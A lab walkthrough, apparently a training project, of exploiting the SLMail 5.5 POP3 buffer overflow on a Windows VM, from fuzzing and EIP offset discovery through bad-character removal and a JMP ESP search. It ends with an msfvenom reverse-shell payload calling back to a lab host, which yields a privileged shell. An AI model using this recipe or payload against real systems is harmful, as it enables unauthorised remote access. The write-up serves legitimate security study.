# Windows Buffer Overflow

## Objective:
This project is centered on understanding and executing a Windows buffer overflow. By targeting a specific Windows virtual machine, the project aimed to shed light on the intricacies of buffer overflow vulnerabilities in a Windows environment, emphasizing the steps and tools necessary to exploit such flaws. The key objectives of the project are detailed below:
- **Manual Buffer Overflow:** Engaging in a step-by-step process to perform a buffer overflow against a Windows target, understanding the specific conditions and elements that lead to successful exploitation.
- **Immunity Debugger Integration:** Leveraging the Immunity Debugger to trace and understand the buffer overflow process in real time. This involved attaching specific processes to the debugger and observing program behavior during exploitation attempts.
- **Character Testing and EIP Control:** Using a fuzzer script to determine the exact point of EIP overwrite, followed by a systematic approach to identifying and removing bad characters to ensure the crafted payload's effectiveness.
- **Payload Crafting and Exploitation:** Utilizing MSFvenom to generate a specific payload, followed by setting breakpoints and adjusting scripts to gain control over the program's execution. Successfully exploiting the vulnerability led to obtaining a reverse shell on the target machine.

## Walkthrough:

- Initialized the BOF machine, accessed the command prompt as an administrator, and ran **“slmgr /rearm”**.


- Ran **“ipconfig”** to determine the machine's IP address as **“10.0.2.10”**.


- Installed **“12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe”** on the Windows VM and rebooted.


- Created a desktop shortcut for **“SLmail.cpl”**.


- Opened both **“SLmail.cpl”** & **“Immunity debugger”** with administrative rights.


- In **“Immunity debugger”**, attached the **“SLmail.exe”** file and ensured it's actively running.


- On the Kali machine, downloaded the fuzzer script labeled **“fuzzerScript.py”** and stored it in a **“BOF”** folder on the desktop.


- Created and edited a file named **“fuzzy.py”** in the same folder.


- Updated **“fuzzy.py”** line 13 with the target IP address and port, then saved changes.


- Conducted an nmap scan on the target VM to confirm open ports and noted the active **“pop3”** protocol.


- Navigated to the BOF directory and executed the **“fuzzy.py”** script using the **“python2 fuzzy.py”** command.


- Observed the EIP update to **“41414141”** in Immunity debugger.


- Generated an MSF pattern of 3000 bytes using the **“msf-pattern_create -l 3000”** command.


- Updated the **“fuzzy.py”** script's buffer with the generated MSF pattern and removed unnecessary loops.


- Reset SLmail.cpl and the Immunity debugger.


- Re-executed the **“fuzzy.py”** script and noted the updated EIP value in Immunity debugger.


- Determined the exact memory offset using the **“msf-pattern_offset -l 3000 -q 39694438”** command.


- Validated the offset by adjusting the buffer in **“fuzzy.py”** and observing the Immunity debugger's EIP value.


- Incorporated a list of potential bad characters into the **“fuzzy.py”** buffer.


- Re-executed the adjusted **“fuzzy.py”** script and followed the ESP in dump within Immunity debugger.


- Identified certain characters as **"bad"** and refined the **"fuzzy.py"** buffer.


- Re-executed the **"fuzzy.py"** script with the refined buffer.


- Searched for mona modules using the **“!mona modules”** command in Immunity debugger.


- Identified a suitable dll with **“!mona find -s "\xff\xe4" -m SLMFC.DLL”**.


- Crafted a shell code using the **“msfvenom -p windows/shell_reverse_tcp LPORT=4444 LHOST=10.0.2.6 -f c -b "\x00\x0a\x0d"”** command.


- Integrated the shell code into **“fuzzy.py”** and adjusted the buffer accordingly.


- Restarted SLmail, ran the **“fuzzy.py”** script, and achieved system access with highest-level permissions as confirmed by the **“whoami”** command.
